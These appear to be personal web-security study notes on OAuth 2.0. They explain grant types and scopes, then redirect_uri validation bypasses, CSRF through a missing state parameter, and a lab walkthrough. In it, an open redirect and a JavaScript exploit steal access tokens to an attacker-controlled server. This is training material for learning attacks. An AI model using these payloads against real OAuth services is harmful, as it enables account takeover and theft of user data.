## OAuth 2.0 Authentication Vulnerabilities 
- Enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.
- Basic OAuth process widely used to integrate 3rd party functionality that requires access to certain data from a user's account. For example, app might use OAuth to request access to your email contacts list so that it can suggest people to connect with. Same mechanism also used to provide 3rd-party authentication services, allowing users to log in with an account that they have with a different website.
- Defines a series of interactions between three distinct parties, namely a client application, a resource owner, and the OAuth service provider:
  - Client app: Website or web app that wants to access user's data
  - Resource owner: User whose data the client app wants to access
  - OAuth service provider: Website or app that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an AuthZ server and resource server.
 - Different ways that the OAuth process can be implemented, known as flows or grant types. The two common flows, implicit and authorization code, share the common stages:
  - The client app requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want
  - The user is prompted to log in to the OAuth service and explicitly give their consent for requested access
  - The client app receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies between the grant types.
  - The client application uses this access token to make API calls fetching relevant data from the resource server

### Grant Types 
- Grant types determine exact sequence of steps that are involved in OAuth process. The grant type also affects how the client app communicates with the OAuth service at each stage, including how the access token itself is sent. For this reason, grant types are often referred to as "OAuth flows"
- OAuth service must be configured to support a particular grant type berfore a client app can initiate the corresponding flow. The client application specifies which grant type it wants to use in the intiial authorization request it sends to the OAuth service.

#### Authorization code grant type
- The client app and OAuth service first use redirects to exchange a series of browser-based HTTP requests that intiate the flow. The user is asked whether they consent to the requested access. If they accept, the client app is granted an "authorization code". The client app then exchanges this code with the OAuth service to receive an "access token", which they can use to make API calls to fetch the relevant user data.
- All communication that takes places from the code/token exchange onward is sent server-to-server over a secure, preconfigured back-channel and is, therefore, invisible to the end user. The secure channel is established when the client application first registers with the OAuth service. At this time, a `client_secret` is also generated, which the client application must use to authenticate itself when sending these server-to-server requests.
- As the most sensitive data (the access token and user data) is not sent via the  browser, this grant type is arguably the most secure. Server-side apps should ideally always use this grant type if possible.

![oauth-authorization-code-flow](https://github.com/user-attachments/assets/a565af99-510c-443c-955e-3675862d6407)

1. Authorization request:
   - The client app sends a request to the OAuth's service's  `/authorization` endpoint asking for permission to access specific user data. Note that the endpoint mapping may vary between providers; however, you should always be able to identify the endpoint based on the parameters within the request:
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
  - This request contains the following noteworthy parameters, usually provided in the query string:
      - `client_id`: Mandatory param containing the unique identifier of the client app. This value is generated when the client app registers with the OAuth service.
      - `redirect_uri`: The URI to which the user's browser should be redirected when sending the authorization code to the client app. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter.
      - `response_type`: Determines which kind of response the client application is expecting, and therefore, which flow it wants to initiate. For the authorization code grant type, the value should be `code`.
      - `scope`: Used to specify which subset of the user's data the client application wants to access. note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the OpenID Connect specification.
      - `state`: Stores a unique, unguessable value that is tied to the current session on the client app. The OAuth service should return this exact value in the response, along with the autorization code. This parameter serves as a form of CSRF token for the client app by making sure that the request to its `/callback` endpoint is from the same person who initiated the OAuth flow.
  2. When the authorization server receives the initial request, it will redirect the user to a login page, where they will be prompted to log ino to their account with the OAuth provider. For example, this is often a social media account. They will then be presented with a list of data the client app wants to access, based on the scopes defined in the authZ request. User can choose to consent for access. Once a user has approved a given scope for a client app, this step will be completed automatically as long as the user still has a valid session with the OAuth service, In other words, the first time the user selects 'Log in with social media', they will need to manually log in and give their consent, but if they revisit the client app later, they will often be able to log back in with a single click.
3. If the user consents to the requested access, their browser will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` param of the AuthZ request. The resulting GET request will contain the AuthZ code as a query parameter. Depending on the config, it may also send the `state` parameter with the same value as in the AuthZ request:
```
 GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```
4. Once the client app receives the authZ code, it needs to exchange it for an access token. To do this, it sends a server-to-server POST request to the OAuth service's `/token` endpoint. All communication from this point on takes place in a secure back-channel, and therefore, cannot usually be observed or controlled by an attacker.
```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```
  - In addition to the `client_id` and AuthZ `code`, you will notice the following new parameters:
      - `client_secret`: Client app must authenticate itself by including the secret key that it was assigned when registering with the OAuth service.
      - `grant_type`: Used to make sure the new endpoint knows which grant type the client app wants to use. In this case, it should be set to `authorization_code`.
5. OAuth service validates access token request. If everything is expected, server responds by granting the client app an access token with the request scope:
```
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile",
    …
}
```
6. Now the client app has the access code, it can finally fetch the user's data from the resource server. To do this, it makes an API call to the OAuth service's `/userinfo` endpoint. The access token is submitted in the `Authorization: Bearer` header to prove that the client app has permission to access the data:
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```
7. Resource server should verify that the token is valid and that it belongs to the current client app. If so, it will respond by sending the requested resource i.e. the user's data based on the scope of the access token. Client app can finally use this data for its intended purpose. In the case of OAuth authentication, it will typically be used as an ID to grant the user an authenticated session, effectively logging them in.

#### Implicit Grant Type
- Much simpler than authorization code. Rather than obtaining an authZ code and then exchanging it for an access token, the client app receives the access token immediately after the user gives their consent.
- It is now considered deprecated! As it is far less secure. When using the implicit grant type, all comms happen via browser redirects - there is no secure back-channel like in the authorization code flow. This means the sensitive access token and the user's data are more exposed to potential attacks.
- More suited to single-page applications and native desktop applications, which cannot easily store the `client_secret` on the back-end, and therefore, don't benefit as much from using the authorization code grant type.
  
<img src="https://portswigger.net/web-security/images/oauth-implicit-flow.jpg" alt="Flow for the OAuth implicit grant type"/>

1. The implicit flow starts in the same way as the authorization code flow. Only major difference is that the response_type parameter must be set to `token`
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
2. User logs in and decides wheter to consent to the requested permissions or not. Process is exactly the same as for the authorization code flow.
3. If the user consents to requested access, the OAuth service will redirect the user's browser to the `redirect_uri` specified in the authorization request; however, instead of sending a query parameter containing an authZ code, it will send the access token and other token-specific data as a URL fragment. As the access token is sent in a URL fragment, it is never sent directly to the client app. Instead, the client app must use a suitable script to extract the fragment and store it:
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
4. Once the client app has successfully extracted the access token from the URL fragment, it can use it to make API calls to the OAuth service's `/userinfo` endpoint. Unlike in the authorization code flow, this also happens via the browser:
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```
5. The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e., the user's data based on the scope associated with the access token. The client app will finally use the data for its intended purpose. In the cause of OAuth authentication, it will typically be used as an ID to grant the user an authenticated session,e ffectivelly logging them in. 

### OAuth Scopes
- For any grant type, the client app has to specify which data it wants to access and what kind of operations it wants to perform. It does this using the `scope` parameter of the authorization request it sends to the OAuth service.
- For basic OAuth, the scopes for which a client app can request access are unique to each OAuth service. As the name of the scope is just an arbitrary text string, the format can vary dramatically between providers. Some even use a full URI as the scope name, similar to a REST API endpoint. For example, when requesting read access to a user's contact list, the scope name might take any of the following forms depending on the oAuth service being used:
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth.scope
```
- When OAuth is used for authentication, the standardized OpenID Connect scopes are often used instead. For example, the scope `openid profile` will grant the client app read access to a predefined set of basic information about the user, such as their email address, username, and so on.

### OAuth Authentication
- Although not originally intended for this purpose, OAuth has evolved into a means of authenticating users as well. For example, you're probably familiar with the option many websites have to use existing social media account rather than register with the website in question. Good chance that mechanism is built on OAuth 2.0.
- Result of OAuth authentication is something that broadly resembles SAML-based single sign-on (SSO). OAuth authentication is generally implemented as follows:
    1. User chooses to log in with social media account. Client app uses social media's OAuth service to request access to some data that it can use to identify the user.
    2. After receiving access token, client app requests this data from the resource server, typically from a dedicated `/userinfo` endpoint.
    3. Once received data, client app uses it in place of username to log the user in. Access toekn it received from AuthZ server is often used instead of traditional password.
- Identifying OAuth: First request will always be to `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In pariticlar, keep an eye out for `client_id`, `redirect_uri`, and `response_type` parameters.
- Recon-wise, you should always try sending a GET request to the following standard endpoints:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
These will often return a JSOn configuration flie containing key information, such as detauls of additional features supported. 

### Improper implementation of the implicit grant type
- Mainly recommended for single-page applications; however, it is also often used in a classic client-server web application because of its relative simplicity.
- Client application is accessing the token from a URL fragment sent from the OAuth service to the cleitn app via JavaScript. If the app wants to maintain a session after the user closes the page, it needs to store the current user data somewhere. To solve this problem, the client app will often submit this data to the server in a POST request and then assign the user a session cookie, effectively logging them in. This is roughly equivalent to the form submission request that might be sent as part of a classic password-based login; hwoever, the server does not have any secrets or passwords to compare the submitted data, which means its implicity trusted.
- The POST reuqest is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client app does not properly check that the access token matches the other data in the request. In this case, an attacker can change the parameters sent the server and impersonate any user.

### Flawed CSRF Protection
- Even though some params are option, they are strongly recommended, such as the `state` parameter. The `state` param should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client app and the OAuth service as a form of CSRF token for the client app. Therefore, if you notice that the authorization request does not send a `state` param, this is extremely interesting from an attacker's perspective. It potentially means that they can intitiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack.
    - Consider a website that allows users to log in using either a classic password-based mechanism or linking their account to a social media profile using oAuth. In this case, if the application fails to use the `state` parameter, an attacker could potentially hijack a victim user's account on the client app by binding it to their own social media account.
 
### Leaking AuthZ Codes and Access Tokens
- Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` param of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.
- In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client app's legit `/callback` endpoint (the original `redirect_uri`) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client app will simply complete the code/token exchange on the attacker's behalf before logging them into the victim's account. Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
- More secure authorization servers will require a `redirect_uri` paramter to be sent when exchanging the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control the second `request_uri` parameter.

#### Flawed redirect_uri Validation
- Best practice to provide an allowlist of their genuine callback URIs when registering with OAuth service. This way, when OAuth service receives a new requiest, it can validate the `request_uri` parameter against this list.
- Some implementations may allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters. You should try adding or removing arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
- If you can append extra values to the default `redirect_uri` param, you might be able to exploit discprenacies between the parsing of the URI by diff. components of the OAuth service. For example, youc an try techniques such as `https://default-host.com&@foo.evul-user.net+@bar.evil-user.net/`. See the following for more on these techniques:
    - [Circumventing SSRF Defenses](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses)
    -  [CORS](https://portswigger.net/web-security/cors#errors-parsing-origin-headers)
  -  You may occassionally come across server-side param pollution vulns. Just in case, you should try submitting duplicate `redirect_uri` params as follows:
```
 https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
- Some servers also give special treatment to `localhost` URIs as they're often used in dev. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the prod environment. This could allow you to bypass validation by registering a domain name like `localhost.evil-user.net`.
- Don't just probe the `redirect_uri` param in isolation though. In the wild, you will often need to experiment with diff. combos of changes to several parameters. Sometimes changing one apram can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri` param, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.
- If you can't get external domain interaction, don't give up. Try to see if you can access different subdomains or paths. For example, the URI will often be OAuth-specific, such as `/oauth/callback` which is unlikely to have interesting subdirectories. Try directory traversal tricks to supply an arbitrary path on the domain. Something like this `https://client-app.com/oauth/callback/../../example/path` may be interpreted back-end as `https://client-app.com/example/path`.
- One of the most useful vulns for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attakcer-controlled domain where you can host any malicious script you like.
- Note that for the implicit grant type, stealing the access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.

#### Lab: Stealing OAuth Access Tokens via an Open Redirect
- So we know there is an open redirect vulnerability somewhere ... let's take a look. When searching through the app, I noticed the ability to comment on a blog, but I did not find an open redirect vuln there. However, when selecting 'Next Post', I noticed the following parameter, `path` in the call: `GET /post/next?path=/post?postId=8`. I replaced the value with `https://google.com`, and I confirmed an open redirect vuln.
- Okay, we now need to examine the OAuth flow. We found that the `redirect_uri` was vulnerbale to the directory traversal trick we wrote about earlier. We found that the following led to a successful redirection to our exploit server:
```
GET /auth?client_id=wkif167dcko8iakmxn21i&redirect_uri=https://0af4009d0438773186de718100830085.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-0a1e0069049a775986497016018d00a6.exploit-server.net/exploit&response_type=token&nonce=-1325804996&scope=openid%20profile%20email
```
- Now we need to generate an exploit on the exploit server
```
  <script>
    if (!window.location.hash) {
        window.location="https://oauth-0a1400e204039a12803a83d6023900d2.oauth-server.net/auth?client_id=pbouyvzg203c2mat5s09c&redirect_uri=https://0aa6009c04be9ac2803a85f9001900bc.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-0a76001f04049a8e804c84a90183009d.exploit-server.net/exploit&response_type=token&nonce=845611160&scope=openid%20profile%20email"
    }
    else {
        window.location = "/?" + document.location.hash.substr(1)
    }
</script>
```

#### OpenID Connect
- OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. 
